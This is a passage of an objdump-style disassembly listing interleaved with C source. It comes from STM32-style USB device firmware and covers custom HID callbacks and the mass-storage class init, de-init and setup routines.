 8008b92:	781b      	ldrb	r3, [r3, #0]
 8008b94:	f003 0302 	and.w	r3, r3, #2
 8008b98:	2b02      	cmp	r3, #2
 8008b9a:	d002      	beq.n	8008ba2 <USBD_CUSTOM_HID_ReceivePacket+0x56>
	  InterruptFlag = 1;
 8008b9c:	4b05      	ldr	r3, [pc, #20]	; (8008bb4 <USBD_CUSTOM_HID_ReceivePacket+0x68>)
 8008b9e:	2201      	movs	r2, #1
 8008ba0:	601a      	str	r2, [r3, #0]
  }
  return (uint8_t)USBD_OK;
 8008ba2:	2300      	movs	r3, #0
}
 8008ba4:	4618      	mov	r0, r3
 8008ba6:	3710      	adds	r7, #16
 8008ba8:	46bd      	mov	sp, r7
 8008baa:	bd80      	pop	{r7, pc}
 8008bac:	200000a7 	.word	0x200000a7
 8008bb0:	2000026c 	.word	0x2000026c
 8008bb4:	20000270 	.word	0x20000270

08008bb8 <USBD_CUSTOM_HID_EP0_RxReady>:
  *         Handles control request data.
  * @param  pdev: device instance
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_EP0_RxReady(USBD_HandleTypeDef *pdev)
{
 8008bb8:	b580      	push	{r7, lr}
 8008bba:	b084      	sub	sp, #16
 8008bbc:	af00      	add	r7, sp, #0
 8008bbe:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008bc0:	687b      	ldr	r3, [r7, #4]
 8008bc2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008bc6:	687b      	ldr	r3, [r7, #4]
 8008bc8:	32b0      	adds	r2, #176	; 0xb0
 8008bca:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bce:	60fb      	str	r3, [r7, #12]

  if (hhid == NULL)
 8008bd0:	68fb      	ldr	r3, [r7, #12]
 8008bd2:	2b00      	cmp	r3, #0
 8008bd4:	d101      	bne.n	8008bda <USBD_CUSTOM_HID_EP0_RxReady+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008bd6:	2303      	movs	r3, #3
 8008bd8:	e016      	b.n	8008c08 <USBD_CUSTOM_HID_EP0_RxReady+0x50>
  }

  if (hhid->IsReportAvailable == 1U)
 8008bda:	68fb      	ldr	r3, [r7, #12]
 8008bdc:	69db      	ldr	r3, [r3, #28]
 8008bde:	2b01      	cmp	r3, #1
 8008be0:	d111      	bne.n	8008c06 <USBD_CUSTOM_HID_EP0_RxReady+0x4e>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008be2:	687b      	ldr	r3, [r7, #4]
 8008be4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008be8:	687a      	ldr	r2, [r7, #4]
 8008bea:	33b0      	adds	r3, #176	; 0xb0
 8008bec:	009b      	lsls	r3, r3, #2
 8008bee:	4413      	add	r3, r2
 8008bf0:	685b      	ldr	r3, [r3, #4]
 8008bf2:	68db      	ldr	r3, [r3, #12]
 8008bf4:	68fa      	ldr	r2, [r7, #12]
 8008bf6:	7810      	ldrb	r0, [r2, #0]
 8008bf8:	68fa      	ldr	r2, [r7, #12]
 8008bfa:	7852      	ldrb	r2, [r2, #1]
 8008bfc:	4611      	mov	r1, r2
 8008bfe:	4798      	blx	r3
                                                                             hhid->Report_buf[1]);
    hhid->IsReportAvailable = 0U;
 8008c00:	68fb      	ldr	r3, [r7, #12]
 8008c02:	2200      	movs	r2, #0
 8008c04:	61da      	str	r2, [r3, #28]
  }

  return (uint8_t)USBD_OK;
 8008c06:	2300      	movs	r3, #0
}
 8008c08:	4618      	mov	r0, r3
 8008c0a:	3710      	adds	r7, #16
 8008c0c:	46bd      	mov	sp, r7
 8008c0e:	bd80      	pop	{r7, pc}

08008c10 <USBD_CUSTOM_HID_GetDeviceQualifierDesc>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetDeviceQualifierDesc(uint16_t *length)
{
 8008c10:	b480      	push	{r7}
 8008c12:	b083      	sub	sp, #12
 8008c14:	af00      	add	r7, sp, #0
 8008c16:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_DeviceQualifierDesc);
 8008c18:	687b      	ldr	r3, [r7, #4]
 8008c1a:	220a      	movs	r2, #10
 8008c1c:	801a      	strh	r2, [r3, #0]

  return USBD_CUSTOM_HID_DeviceQualifierDesc;
 8008c1e:	4b03      	ldr	r3, [pc, #12]	; (8008c2c <USBD_CUSTOM_HID_GetDeviceQualifierDesc+0x1c>)
}
 8008c20:	4618      	mov	r0, r3
 8008c22:	370c      	adds	r7, #12
 8008c24:	46bd      	mov	sp, r7
 8008c26:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008c2a:	4770      	bx	lr
 8008c2c:	2000009c 	.word	0x2000009c

08008c30 <USBD_CUSTOM_HID_RegisterInterface>:
  * @param  fops: CUSTOMHID Interface callback
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_RegisterInterface(USBD_HandleTypeDef *pdev,
                                          USBD_CUSTOM_HID_ItfTypeDef *fops)
{
 8008c30:	b480      	push	{r7}
 8008c32:	b083      	sub	sp, #12
 8008c34:	af00      	add	r7, sp, #0
 8008c36:	6078      	str	r0, [r7, #4]
 8008c38:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8008c3a:	683b      	ldr	r3, [r7, #0]
 8008c3c:	2b00      	cmp	r3, #0
 8008c3e:	d101      	bne.n	8008c44 <USBD_CUSTOM_HID_RegisterInterface+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8008c40:	2303      	movs	r3, #3
 8008c42:	e009      	b.n	8008c58 <USBD_CUSTOM_HID_RegisterInterface+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8008c44:	687b      	ldr	r3, [r7, #4]
 8008c46:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008c4a:	687a      	ldr	r2, [r7, #4]
 8008c4c:	33b0      	adds	r3, #176	; 0xb0
 8008c4e:	009b      	lsls	r3, r3, #2
 8008c50:	4413      	add	r3, r2
 8008c52:	683a      	ldr	r2, [r7, #0]
 8008c54:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8008c56:	2300      	movs	r3, #0
}
 8008c58:	4618      	mov	r0, r3
 8008c5a:	370c      	adds	r7, #12
 8008c5c:	46bd      	mov	sp, r7
 8008c5e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008c62:	4770      	bx	lr

08008c64 <USBD_MSC_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008c64:	b580      	push	{r7, lr}
 8008c66:	b084      	sub	sp, #16
 8008c68:	af00      	add	r7, sp, #0
 8008c6a:	6078      	str	r0, [r7, #4]
 8008c6c:	460b      	mov	r3, r1
 8008c6e:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_MSC_BOT_HandleTypeDef *hmsc;

  hmsc = (USBD_MSC_BOT_HandleTypeDef *)USBD_malloc_MSC(sizeof(USBD_MSC_BOT_HandleTypeDef));
 8008c70:	f241 0074 	movw	r0, #4212	; 0x1074
 8008c74:	f004 f938 	bl	800cee8 <USBD_static_malloc_MSC>
 8008c78:	60f8      	str	r0, [r7, #12]

  if (hmsc == NULL)
 8008c7a:	68fb      	ldr	r3, [r7, #12]
 8008c7c:	2b00      	cmp	r3, #0
 8008c7e:	d109      	bne.n	8008c94 <USBD_MSC_Init+0x30>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008c80:	687b      	ldr	r3, [r7, #4]
 8008c82:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c86:	687b      	ldr	r3, [r7, #4]
 8008c88:	32b0      	adds	r2, #176	; 0xb0
 8008c8a:	2100      	movs	r1, #0
 8008c8c:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008c90:	2302      	movs	r3, #2
 8008c92:	e06e      	b.n	8008d72 <USBD_MSC_Init+0x10e>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hmsc;
 8008c94:	687b      	ldr	r3, [r7, #4]
 8008c96:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c9a:	687b      	ldr	r3, [r7, #4]
 8008c9c:	32b0      	adds	r2, #176	; 0xb0
 8008c9e:	68f9      	ldr	r1, [r7, #12]
 8008ca0:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008ca4:	687b      	ldr	r3, [r7, #4]
 8008ca6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008caa:	687b      	ldr	r3, [r7, #4]
 8008cac:	32b0      	adds	r2, #176	; 0xb0
 8008cae:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008cb2:	687b      	ldr	r3, [r7, #4]
 8008cb4:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008cb8:	687b      	ldr	r3, [r7, #4]
 8008cba:	7c1b      	ldrb	r3, [r3, #16]
 8008cbc:	2b00      	cmp	r3, #0
 8008cbe:	d12b      	bne.n	8008d18 <USBD_MSC_Init+0xb4>
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008cc0:	4b2e      	ldr	r3, [pc, #184]	; (8008d7c <USBD_MSC_Init+0x118>)
 8008cc2:	7819      	ldrb	r1, [r3, #0]
 8008cc4:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008cc8:	2202      	movs	r2, #2
 8008cca:	6878      	ldr	r0, [r7, #4]
 8008ccc:	f003 feca 	bl	800ca64 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008cd0:	4b2a      	ldr	r3, [pc, #168]	; (8008d7c <USBD_MSC_Init+0x118>)
 8008cd2:	781b      	ldrb	r3, [r3, #0]
 8008cd4:	f003 020f 	and.w	r2, r3, #15
 8008cd8:	6879      	ldr	r1, [r7, #4]
 8008cda:	4613      	mov	r3, r2
 8008cdc:	009b      	lsls	r3, r3, #2
 8008cde:	4413      	add	r3, r2
 8008ce0:	009b      	lsls	r3, r3, #2
 8008ce2:	440b      	add	r3, r1
 8008ce4:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008ce8:	2201      	movs	r2, #1
 8008cea:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008cec:	4b24      	ldr	r3, [pc, #144]	; (8008d80 <USBD_MSC_Init+0x11c>)
 8008cee:	7819      	ldrb	r1, [r3, #0]
 8008cf0:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008cf4:	2202      	movs	r2, #2
 8008cf6:	6878      	ldr	r0, [r7, #4]
 8008cf8:	f003 feb4 	bl	800ca64 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008cfc:	4b20      	ldr	r3, [pc, #128]	; (8008d80 <USBD_MSC_Init+0x11c>)
 8008cfe:	781b      	ldrb	r3, [r3, #0]
 8008d00:	f003 020f 	and.w	r2, r3, #15
 8008d04:	6879      	ldr	r1, [r7, #4]
 8008d06:	4613      	mov	r3, r2
 8008d08:	009b      	lsls	r3, r3, #2
 8008d0a:	4413      	add	r3, r2
 8008d0c:	009b      	lsls	r3, r3, #2
 8008d0e:	440b      	add	r3, r1
 8008d10:	3324      	adds	r3, #36	; 0x24
 8008d12:	2201      	movs	r2, #1
 8008d14:	801a      	strh	r2, [r3, #0]
 8008d16:	e028      	b.n	8008d6a <USBD_MSC_Init+0x106>
  }
  else
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008d18:	4b18      	ldr	r3, [pc, #96]	; (8008d7c <USBD_MSC_Init+0x118>)
 8008d1a:	7819      	ldrb	r1, [r3, #0]
 8008d1c:	2340      	movs	r3, #64	; 0x40
 8008d1e:	2202      	movs	r2, #2
 8008d20:	6878      	ldr	r0, [r7, #4]
 8008d22:	f003 fe9f 	bl	800ca64 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008d26:	4b15      	ldr	r3, [pc, #84]	; (8008d7c <USBD_MSC_Init+0x118>)
 8008d28:	781b      	ldrb	r3, [r3, #0]
 8008d2a:	f003 020f 	and.w	r2, r3, #15
 8008d2e:	6879      	ldr	r1, [r7, #4]
 8008d30:	4613      	mov	r3, r2
 8008d32:	009b      	lsls	r3, r3, #2
 8008d34:	4413      	add	r3, r2
 8008d36:	009b      	lsls	r3, r3, #2
 8008d38:	440b      	add	r3, r1
 8008d3a:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008d3e:	2201      	movs	r2, #1
 8008d40:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008d42:	4b0f      	ldr	r3, [pc, #60]	; (8008d80 <USBD_MSC_Init+0x11c>)
 8008d44:	7819      	ldrb	r1, [r3, #0]
 8008d46:	2340      	movs	r3, #64	; 0x40
 8008d48:	2202      	movs	r2, #2
 8008d4a:	6878      	ldr	r0, [r7, #4]
 8008d4c:	f003 fe8a 	bl	800ca64 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008d50:	4b0b      	ldr	r3, [pc, #44]	; (8008d80 <USBD_MSC_Init+0x11c>)
 8008d52:	781b      	ldrb	r3, [r3, #0]
 8008d54:	f003 020f 	and.w	r2, r3, #15
 8008d58:	6879      	ldr	r1, [r7, #4]
 8008d5a:	4613      	mov	r3, r2
 8008d5c:	009b      	lsls	r3, r3, #2
 8008d5e:	4413      	add	r3, r2
 8008d60:	009b      	lsls	r3, r3, #2
 8008d62:	440b      	add	r3, r1
 8008d64:	3324      	adds	r3, #36	; 0x24
 8008d66:	2201      	movs	r2, #1
 8008d68:	801a      	strh	r2, [r3, #0]
  }

  /* Init the BOT  layer */
  MSC_BOT_Init(pdev);
 8008d6a:	6878      	ldr	r0, [r7, #4]
 8008d6c:	f000 fa2c 	bl	80091c8 <MSC_BOT_Init>

  return (uint8_t)USBD_OK;
 8008d70:	2300      	movs	r3, #0
}
 8008d72:	4618      	mov	r0, r3
 8008d74:	3710      	adds	r7, #16
 8008d76:	46bd      	mov	sp, r7
 8008d78:	bd80      	pop	{r7, pc}
 8008d7a:	bf00      	nop
 8008d7c:	2000010b 	.word	0x2000010b
 8008d80:	2000010a 	.word	0x2000010a

08008d84 <USBD_MSC_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008d84:	b580      	push	{r7, lr}
 8008d86:	b082      	sub	sp, #8
 8008d88:	af00      	add	r7, sp, #0
 8008d8a:	6078      	str	r0, [r7, #4]
 8008d8c:	460b      	mov	r3, r1
 8008d8e:	70fb      	strb	r3, [r7, #3]
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close MSC EPs */
  (void)USBD_LL_CloseEP(pdev, MSCOutEpAdd);
 8008d90:	4b26      	ldr	r3, [pc, #152]	; (8008e2c <USBD_MSC_DeInit+0xa8>)
 8008d92:	781b      	ldrb	r3, [r3, #0]
 8008d94:	4619      	mov	r1, r3
 8008d96:	6878      	ldr	r0, [r7, #4]
 8008d98:	f003 fea2 	bl	800cae0 <USBD_LL_CloseEP>
  pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 0U;
 8008d9c:	4b23      	ldr	r3, [pc, #140]	; (8008e2c <USBD_MSC_DeInit+0xa8>)
 8008d9e:	781b      	ldrb	r3, [r3, #0]
 8008da0:	f003 020f 	and.w	r2, r3, #15
 8008da4:	6879      	ldr	r1, [r7, #4]
 8008da6:	4613      	mov	r3, r2
 8008da8:	009b      	lsls	r3, r3, #2
 8008daa:	4413      	add	r3, r2
 8008dac:	009b      	lsls	r3, r3, #2
 8008dae:	440b      	add	r3, r1
 8008db0:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008db4:	2200      	movs	r2, #0
 8008db6:	801a      	strh	r2, [r3, #0]

  /* Close EP IN */
  (void)USBD_LL_CloseEP(pdev, MSCInEpAdd);
 8008db8:	4b1d      	ldr	r3, [pc, #116]	; (8008e30 <USBD_MSC_DeInit+0xac>)
 8008dba:	781b      	ldrb	r3, [r3, #0]
 8008dbc:	4619      	mov	r1, r3
 8008dbe:	6878      	ldr	r0, [r7, #4]
 8008dc0:	f003 fe8e 	bl	800cae0 <USBD_LL_CloseEP>
  pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 0U;
 8008dc4:	4b1a      	ldr	r3, [pc, #104]	; (8008e30 <USBD_MSC_DeInit+0xac>)
 8008dc6:	781b      	ldrb	r3, [r3, #0]
 8008dc8:	f003 020f 	and.w	r2, r3, #15
 8008dcc:	6879      	ldr	r1, [r7, #4]
 8008dce:	4613      	mov	r3, r2
 8008dd0:	009b      	lsls	r3, r3, #2
 8008dd2:	4413      	add	r3, r2
 8008dd4:	009b      	lsls	r3, r3, #2
 8008dd6:	440b      	add	r3, r1
 8008dd8:	3324      	adds	r3, #36	; 0x24
 8008dda:	2200      	movs	r2, #0
 8008ddc:	801a      	strh	r2, [r3, #0]

  /* Free MSC Class Resources */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008dde:	687b      	ldr	r3, [r7, #4]
 8008de0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008de4:	687b      	ldr	r3, [r7, #4]
 8008de6:	32b0      	adds	r2, #176	; 0xb0
 8008de8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008dec:	2b00      	cmp	r3, #0
 8008dee:	d018      	beq.n	8008e22 <USBD_MSC_DeInit+0x9e>
  {
    /* De-Init the BOT layer */
    MSC_BOT_DeInit(pdev);
 8008df0:	6878      	ldr	r0, [r7, #4]
 8008df2:	f000 fa6f 	bl	80092d4 <MSC_BOT_DeInit>

    (void)USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 8008df6:	687b      	ldr	r3, [r7, #4]
 8008df8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008dfc:	687b      	ldr	r3, [r7, #4]
 8008dfe:	32b0      	adds	r2, #176	; 0xb0
 8008e00:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e04:	4618      	mov	r0, r3
 8008e06:	f004 f87d 	bl	800cf04 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId]  = NULL;
 8008e0a:	687b      	ldr	r3, [r7, #4]
 8008e0c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e10:	687b      	ldr	r3, [r7, #4]
 8008e12:	32b0      	adds	r2, #176	; 0xb0
 8008e14:	2100      	movs	r1, #0
 8008e16:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008e1a:	687b      	ldr	r3, [r7, #4]
 8008e1c:	2200      	movs	r2, #0
 8008e1e:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8008e22:	2300      	movs	r3, #0
}
 8008e24:	4618      	mov	r0, r3
 8008e26:	3708      	adds	r7, #8
 8008e28:	46bd      	mov	sp, r7
 8008e2a:	bd80      	pop	{r7, pc}
 8008e2c:	2000010b 	.word	0x2000010b
 8008e30:	2000010a 	.word	0x2000010a

08008e34 <USBD_MSC_Setup>:
  * @param  pdev: device instance
  * @param  req: USB request
  * @retval status
  */
uint8_t USBD_MSC_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 8008e34:	b580      	push	{r7, lr}
 8008e36:	b086      	sub	sp, #24
 8008e38:	af00      	add	r7, sp, #0
 8008e3a:	6078      	str	r0, [r7, #4]
 8008e3c:	6039      	str	r1, [r7, #0]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008e3e:	687b      	ldr	r3, [r7, #4]
 8008e40:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e44:	687b      	ldr	r3, [r7, #4]
 8008e46:	32b0      	adds	r2, #176	; 0xb0
 8008e48:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e4c:	613b      	str	r3, [r7, #16]
  USBD_StatusTypeDef ret = USBD_OK;
 8008e4e:	2300      	movs	r3, #0
 8008e50:	75fb      	strb	r3, [r7, #23]
  uint16_t status_info = 0U;
 8008e52:	2300      	movs	r3, #0
 8008e54:	81fb      	strh	r3, [r7, #14]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8008e56:	693b      	ldr	r3, [r7, #16]
 8008e58:	2b00      	cmp	r3, #0
 8008e5a:	d101      	bne.n	8008e60 <USBD_MSC_Setup+0x2c>
  {
    return (uint8_t)USBD_FAIL;
 8008e5c:	2303      	movs	r3, #3
 8008e5e:	e0e1      	b.n	8009024 <USBD_MSC_Setup+0x1f0>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 8008e60:	683b      	ldr	r3, [r7, #0]
 8008e62:	781b      	ldrb	r3, [r3, #0]
 8008e64:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008e68:	2b00      	cmp	r3, #0
 8008e6a:	d053      	beq.n	8008f14 <USBD_MSC_Setup+0xe0>
 8008e6c:	2b20      	cmp	r3, #32
 8008e6e:	f040 80d1 	bne.w	8009014 <USBD_MSC_Setup+0x1e0>
  {
    /* Class request */
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 8008e72:	683b      	ldr	r3, [r7, #0]
 8008e74:	785b      	ldrb	r3, [r3, #1]
 8008e76:	2bfe      	cmp	r3, #254	; 0xfe
 8008e78:	d002      	beq.n	8008e80 <USBD_MSC_Setup+0x4c>
 8008e7a:	2bff      	cmp	r3, #255	; 0xff
 8008e7c:	d02a      	beq.n	8008ed4 <USBD_MSC_Setup+0xa0>
 8008e7e:	e041      	b.n	8008f04 <USBD_MSC_Setup+0xd0>
      {
        case BOT_GET_MAX_LUN:
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008e80:	683b      	ldr	r3, [r7, #0]
 8008e82:	885b      	ldrh	r3, [r3, #2]
 8008e84:	2b00      	cmp	r3, #0
 8008e86:	d11e      	bne.n	8008ec6 <USBD_MSC_Setup+0x92>
 8008e88:	683b      	ldr	r3, [r7, #0]
 8008e8a:	88db      	ldrh	r3, [r3, #6]
 8008e8c:	2b01      	cmp	r3, #1
 8008e8e:	d11a      	bne.n	8008ec6 <USBD_MSC_Setup+0x92>
              ((req->bmRequest & 0x80U) == 0x80U))
 8008e90:	683b      	ldr	r3, [r7, #0]
 8008e92:	781b      	ldrb	r3, [r3, #0]
 8008e94:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008e96:	2b00      	cmp	r3, #0
 8008e98:	da15      	bge.n	8008ec6 <USBD_MSC_Setup+0x92>
          {
            hmsc->max_lun = (uint32_t)((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetMaxLun();
 8008e9a:	687b      	ldr	r3, [r7, #4]
 8008e9c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008ea0:	687a      	ldr	r2, [r7, #4]
 8008ea2:	33b0      	adds	r3, #176	; 0xb0
 8008ea4:	009b      	lsls	r3, r3, #2
 8008ea6:	4413      	add	r3, r2
 8008ea8:	685b      	ldr	r3, [r3, #4]
 8008eaa:	699b      	ldr	r3, [r3, #24]
 8008eac:	4798      	blx	r3
 8008eae:	4603      	mov	r3, r0
 8008eb0:	461a      	mov	r2, r3
 8008eb2:	693b      	ldr	r3, [r7, #16]
 8008eb4:	601a      	str	r2, [r3, #0]
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->max_lun, 1U);
 8008eb6:	693b      	ldr	r3, [r7, #16]
 8008eb8:	2201      	movs	r2, #1
 8008eba:	4619      	mov	r1, r3
 8008ebc:	6878      	ldr	r0, [r7, #4]
 8008ebe:	f003 f979 	bl	800c1b4 <USBD_CtlSendData>
 8008ec2:	bf00      	nop
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008ec4:	e025      	b.n	8008f12 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008ec6:	6839      	ldr	r1, [r7, #0]
 8008ec8:	6878      	ldr	r0, [r7, #4]
 8008eca:	f003 f902 	bl	800c0d2 <USBD_CtlError>
            ret = USBD_FAIL;
 8008ece:	2303      	movs	r3, #3
 8008ed0:	75fb      	strb	r3, [r7, #23]
          break;
 8008ed2:	e01e      	b.n	8008f12 <USBD_MSC_Setup+0xde>

        case BOT_RESET :
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008ed4:	683b      	ldr	r3, [r7, #0]
 8008ed6:	885b      	ldrh	r3, [r3, #2]
 8008ed8:	2b00      	cmp	r3, #0
 8008eda:	d10c      	bne.n	8008ef6 <USBD_MSC_Setup+0xc2>
 8008edc:	683b      	ldr	r3, [r7, #0]
 8008ede:	88db      	ldrh	r3, [r3, #6]
 8008ee0:	2b00      	cmp	r3, #0
 8008ee2:	d108      	bne.n	8008ef6 <USBD_MSC_Setup+0xc2>
              ((req->bmRequest & 0x80U) != 0x80U))
 8008ee4:	683b      	ldr	r3, [r7, #0]
 8008ee6:	781b      	ldrb	r3, [r3, #0]
 8008ee8:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008eea:	2b00      	cmp	r3, #0
 8008eec:	db03      	blt.n	8008ef6 <USBD_MSC_Setup+0xc2>
          {
            MSC_BOT_Reset(pdev);
 8008eee:	6878      	ldr	r0, [r7, #4]
 8008ef0:	f000 f9bc 	bl	800926c <MSC_BOT_Reset>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008ef4:	e00d      	b.n	8008f12 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008ef6:	6839      	ldr	r1, [r7, #0]
 8008ef8:	6878      	ldr	r0, [r7, #4]
 8008efa:	f003 f8ea 	bl	800c0d2 <USBD_CtlError>
            ret = USBD_FAIL;
 8008efe:	2303      	movs	r3, #3
 8008f00:	75fb      	strb	r3, [r7, #23]
          break;
 8008f02:	e006      	b.n	8008f12 <USBD_MSC_Setup+0xde>

        default:
          USBD_CtlError(pdev, req);
 8008f04:	6839      	ldr	r1, [r7, #0]
 8008f06:	6878      	ldr	r0, [r7, #4]
 8008f08:	f003 f8e3 	bl	800c0d2 <USBD_CtlError>
          ret = USBD_FAIL;
 8008f0c:	2303      	movs	r3, #3
 8008f0e:	75fb      	strb	r3, [r7, #23]
          break;
 8008f10:	bf00      	nop
      }
      break;
 8008f12:	e086      	b.n	8009022 <USBD_MSC_Setup+0x1ee>
    /* Interface & Endpoint request */
    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8008f14:	683b      	ldr	r3, [r7, #0]
 8008f16:	785b      	ldrb	r3, [r3, #1]
 8008f18:	2b0b      	cmp	r3, #11
 8008f1a:	d872      	bhi.n	8009002 <USBD_MSC_Setup+0x1ce>
 8008f1c:	a201      	add	r2, pc, #4	; (adr r2, 8008f24 <USBD_MSC_Setup+0xf0>)
 8008f1e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008f22:	bf00      	nop
 8008f24:	08008f55 	.word	0x08008f55
 8008f28:	08008fd1 	.word	0x08008fd1
 8008f2c:	08009003 	.word	0x08009003
 8008f30:	08009003 	.word	0x08009003
 8008f34:	08009003 	.word	0x08009003
 8008f38:	08009003 	.word	0x08009003
 8008f3c:	08009003 	.word	0x08009003
 8008f40:	08009003 	.word	0x08009003
 8008f44:	08009003 	.word	0x08009003
 8008f48:	08009003 	.word	0x08009003
 8008f4c:	08008f7f 	.word	0x08008f7f
